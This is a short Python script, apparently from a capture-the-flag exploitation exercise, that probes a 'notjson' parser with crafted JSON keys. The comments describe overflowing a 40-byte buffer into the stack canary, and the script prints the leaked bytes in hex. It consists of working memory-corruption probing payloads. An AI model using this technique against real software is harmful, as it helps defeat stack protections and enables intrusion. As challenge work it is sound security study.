#!/usr/bin/env python3
"""Probe the notjson parser's key-loop 'walk' behaviour."""
import drv, re, sys

def show(tag, payload, token=b'Enter your JSON:'):
    out = drv.run(payload, token=token)
    m = re.search(rb'Key: (.*?), Description', out, re.S)
    print("=== %s ===" % tag)
    print("raw tail:", repr(out[out.find(b'Enter your JSON:'):]))
    if m:
        le = m.group(1)
        print("leak len=%d" % len(le))
        print("leak hex:", le.hex())
    print()

if __name__ == "__main__":
    # 1) fill buffer with 40 non-null bytes: 38 alnum + 2 non-alnum
    show("38A+2!", b'{"' + b'A'*38 + b'!'*2 + b'|d":{}}')
    # 2) add 3rd '!' -> writes at index 40 (canary LSB)
    show("38A+3!", b'{"' + b'A'*38 + b'!'*3 + b'|d":{}}')
    # 3) add 4th,5th
    show("38A+5!", b'{"' + b'A'*38 + b'!'*5 + b'|d":{}}')
    # 4) walk further with alnum (no trash)
    show("38A+2!+B*4", b'{"' + b'A'*38 + b'!'*2 + b'B'*4 + b'|d":{}}')
